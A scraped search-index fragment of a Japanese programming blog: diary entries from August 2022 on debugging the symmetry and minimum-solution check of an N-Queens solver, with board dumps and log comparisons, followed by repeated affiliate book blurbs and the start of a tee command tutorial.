たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-08-10T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-08-10-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-08-10-01-ani/","title":"NQueen日記 2022/08/10"},{"content":"8月9日 抽出した新ロジックだけのルートの中から、クイーン数に影響のあるもの、\nsymmetryOpsのあとで、NQueenをして最終行に到達するものを探したところ\n以下の1個が最終行に到達するものだった。\nt0:2,t1:5,l0:4,l1:6,b0:4,b1:1,r0:2,r1:5 \u0026lt;\u0026gt;N=8 STEP:251-7063 row:8 bit:0 7 6 5 4 3 2 1 0 ============================= 0| 00000100 1| 00100000 2| 00000010 3| 00000000 4| 10000000 5| 00000001 6| 01000000 7| 00001000 反時計回りに90度回転させると以下のようになる\nt0:2,t1:5,l0:2,l1:5,b0:4,b1:6,r0:4,r1:1 7 6 5 4 3 2 1 0 ============================= 0| 00000100 1| 00100000 2| 10000000 3| 00000001 4| 00000000 5| 01000000 6| 00000010 7| 00001000 ログを見てみるとやはり存在した。\n最小値判定が甘かったみたい。\n最小値判定の見直しが必要。\n現在は、上2行t0,t1と左、下、右、ミラー上、ミラー左、ミラー下、ミラー右を判定している\nt0 2 t 5 \u0026lt; l0 4 l1 6 t0 2 t 5 \u0026lt; b0 4 b1 1 . . . これだと今回のように上2行と右2行の値が同じ時にうまくいかなくなる\nt0:2,t1:5 = r0:2,r1:5\nt0:2,t1:5,l0:4,l1:6,b0:4,b1:1,r0:2,r1:5 \u0026gt; t0:2,t1:5,l0:2,l1:5,b0:4,b1:6,r0:4,r1:1\nのように全体の比較が必要でロジックを見直す必要がある。\nまずは 25464125 \u0026gt; 25254641のように8桁の数字に直して比較しようと思う。\n将来的にはビット計算で計算を効率化したい。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-08-09T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-08-09-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-08-09-01-ani/","title":"NQueen日記 2022/08/09"},{"content":"8月8日 先日抽出した、新ロジックだけsymmetryOpsを突破した組み合わせのクイーンの配置を出力してみた。\nt0:1,t1:3,l0:4,l1:7,b0:1,b1:3,r0:2,r1:7 7 6 5 4 3 2 1 0 ============================= 0| 00000010 1| 00001000 2| 00000000 3| 00000000 4| 10000000 5| 00000001 6| 00010000 7| 01000000 t0:1,t1:4,l0:5,l1:7,b0:1,b1:4,r0:3,r1:7 7 6 5 4 3 2 1 0 ============================= 0| 00000010 1| 00010000 2| 00000000 3| 00000000 4| 00000001 5| 10000000 6| 00001000 7| 01000000 t0:1,t1:5,l0:4,l1:7,b0:1,b1:5,r0:2,r1:7 7 6 5 4 3 2 1 0 ============================= 0| 00000010 1| 00100000 2| 00000000 3| 00000000 4| 10000000 5| 00000001 6| 00000100 7| 01000000 t0:1,t1:5,l0:5,l1:7,b0:1,b1:5,r0:4,r1:7 7 6 5 4 3 2 1 0 ============================= 0| 00000010 1| 00100000 2| 00000000 3| 00000001 4| 00000000 5| 10000000 6| 00000100 7| 01000000 t0:2,t1:5,l0:4,l1:6,b0:4,b1:1,r0:2,r1:5 7 6 5 4 3 2 1 0 ============================= 0| 00000100 1| 00100000 2| 00000010 3| 00000000 4| 10000000 5| 00000001 6| 01000000 7| 00001000 ぱっと見おかしいものはないが、気になるのは最小値チェックが正しいかどうか。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-08-08T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-08-08-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-08-08-01-ani/","title":"NQueen日記 2022/08/08"},{"content":"8月5日 N8でsymmetryOps直後の新旧ロジックのクイーンの配置を比較してみた。\nN8だとユニーク数の正しい数は12 新ロジックだとユニーク数が13で余分に1つ多い。\n新旧ロジックそれぞれでsymmetryOpsを突破した数は新ロジックが163なのに対し旧ロジックが179で旧ロジックの方がなぜか多い。\nとりあえず、新ロジックにあって旧ロジックにないルートを抽出してみた。\ncat q q n|sort |uniq -c|sort -n (qは旧ロジックの結果、nは新ロジックの結果。sortして数が1のものが新ロジックだけのルート） t0:1,t1:3,l0:4,l1:7,b0:1,b1:3,r0:2,r1:7 t0:1,t1:4,l0:5,l1:7,b0:1,b1:4,r0:3,r1:7 t0:1,t1:5,l0:4,l1:7,b0:1,b1:5,r0:2,r1:7 t0:1,t1:5,l0:5,l1:7,b0:1,b1:5,r0:4,r1:7 t0:2,t1:5,l0:4,l1:6,b0:4,b1:1,r0:2,r1:5 t0 上1行目 t1 上2行目 という感じでlが左 b が下 r が右にクイーンを配置した場所 それぞれのクイーンの配置を検討していきたいと思う\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-08-05T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-08-05-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-08-05-01-ani/","title":"NQueen日記 2022/08/05"},{"content":"いままでのNQueenは NQueenは、ひとつの解には、盤面を90度・180度・270度回転、及びそれらの鏡像の合計8個の対称解が存在します。これを利用した、対称的な解を除去し、ユニーク解のみを求める方法として解がみつかるとすべての対称解を生成し、 状態を数値とみなして最も小さいもののみを解とする方法（最小解選択法）をベースに枝刈りを追加したロジックで高速化を試みていました。\nこのロジックをGPUを利用して並列化し高速化しようとしました。\n確かにかなり速くなったのですがボトルネックが見つかりました。最小解選択法は、最終行で回転チェックをして最少解判定(symmetryOps)を行うのですが、symmetryOpsに必要な情報として各行のどこにクイーンを置いたかという配列(aBoard)が必要になります。このaBoard配列をGPUに呼び出す際に渡す必要があるのですが、それなりの情報量があり、これがかなりのボトルネックとなってました。\nそんな時に、鈴木維一郎先生が、N27を実現したプロジェクトのプログラムを見つけて来てくれました。\nhttps://github.com/preusser/q27/blob/master/pitch.pdf\nこのプログラムのロジックは、最初にsymmetryOpsに必要な上下左右2行2列にクイーンを置き、symmetryOpsをした後に残りのNQueenを実行するというものでした。\nこれなら、GPUにaBoard配列を渡さなくて済むので問題解決ではと思い取り組みました。\n進めていくと、上下左右2行2列にクイーンを置くロジックが遅すぎて今までのロジックの10倍くらい時間がかかることが分かりました。\nそこで、現在はこの上下左右2行2列にクイーンを置くロジックを速くできないか日々格闘しているところです。\n8月4日 上下左右2行2列にクイーンを置くロジックを上下左右2行2列にしかクイーンを置けないようにしながら1行目から最終行まで一旦NQueenをするというロジックを開発して数が合うまでにはなった。\nしかし、symmetryOpsを追加するとn8から数が合わなくなる。\nN: Unique hh:mm:ss.ms 4: 1 0.00 5: 2 0.00 6: 1 0.00 7: 6 0.00 8: 13 0.00 9: 47 0.00 10: 93 0.01 11: 350 0.04 12: 1855 0.12 13: 9407 0.35 14: 46496 1.08 15: 288695 3.61 1週間以上考えてもさっぱりわからないので新ロジックと既存のnq27_N-Queen.cの両方にsymmetryOpsした直後の状態をロギングするようにして違いを眺めることにした。ロギングの準備は終わったが、n5から数が合わないなら楽だがn8からだと比較するのが結構大変そうだ。\n時間がかかりそうなので日記形式で日々の取り組みを記すことにした。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-08-04T09:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-08-04-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-08-04-01-ani/","title":"NQueen日記 2022/08/04"},{"content":"teeコマンド ファイルへのリダイレクトとパイプを同時に行う 出力するファイルは都度新規作成ではなく追記する teeコマンド概要 teeコマンドは、標準入力から受け取った出力を、標準出力へ出力しつつ、同時にファイルに書き出すコマンドです。\nteeコマンドの書式 コマンド | tee ファイル | コマンド2\nコマンド | tee ファイル1 ファイル2 ファイル3……\nteeコマンドの主なオプション オプション 意味 -a 指定したファイルが既に存在する場合、新規にファイルを作成せずにすでに存在するファイルに追加する（リダイレクトの「\u0026raquo;」に相当） teeコマンド詳細説明 